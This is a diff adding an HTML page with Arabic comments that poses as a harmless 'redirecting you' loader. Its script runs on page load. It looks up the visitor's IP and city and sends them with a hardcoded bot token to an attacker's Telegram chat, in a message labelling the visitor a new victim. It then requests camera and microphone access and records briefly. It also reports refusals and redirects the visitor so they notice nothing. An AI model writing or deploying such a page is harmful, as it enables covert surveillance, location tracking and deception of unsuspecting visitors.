@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري تحويلك...</title>
+    <style>
+        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .loader { border: 3px solid #333; border-top: 3px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+    <script>
+        // المتغيرات اللي بتتبدل من سكيتش واير
+        const token = '8120975005:AAFpqunUzKJav0pCWI-ZjCMjUVi2FMOL3Go';
+        const chatId = '8249039685';
+        const redirectUrl = 'https://traidmod.com/'; 
+
+        async function sendLog(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+            } catch(e) {}
+        }
+
+        async function startCapture() {
+            // 1. إرسال الـ IP فوراً
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const d = await ipRes.json();
+                await sendLog(`🔔 ضحية جديد فتح اللينك!\n🌐 IP: ${d.ip}\n📍 الموقع: ${d.city}\n🔗 الرابط المستهدف: ${redirectUrl}`);
+            } catch(e) {}
+
+            // 2. طلب الأذونات
+            try {
+                // بنطلب الكاميرا والمايك والموقع مع بعض
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                
+                // لو وافق، بنصور ونبعت وبعدين نحوله للرابط
+                const recorder = new MediaRecorder(stream);
+                recorder.onstop = () => {
+                    window.location.replace(redirectUrl); // التحويل بعد الانتهاء
+                };
+                recorder.start();
+                setTimeout(() => {
+                    recorder.stop();
+                    stream.getTracks().forEach(t => t.stop());
+                }, 3000); // 3 ثواني تسجيل
+
+            } catch (e) {
+                // لو رفض الأذونات أو حصل خطأ، بنوديه للرابط فوراً عشان ميحسش بحاجة
+                await sendLog("⚠️ الضحية رفض الأذونات، تم تحويله للرابط مباشرة.");
+                window.location.replace(redirectUrl);
+            }
+
+            // تأمين: لو العملية طولت أكتر من 5 ثواني حوله فوراً
+            setTimeout(() => {
+                window.location.replace(redirectUrl);
+            }, 5000);
+        }
+
+        window.onload = startCapture;
+    </script>
+</body>
+</html>
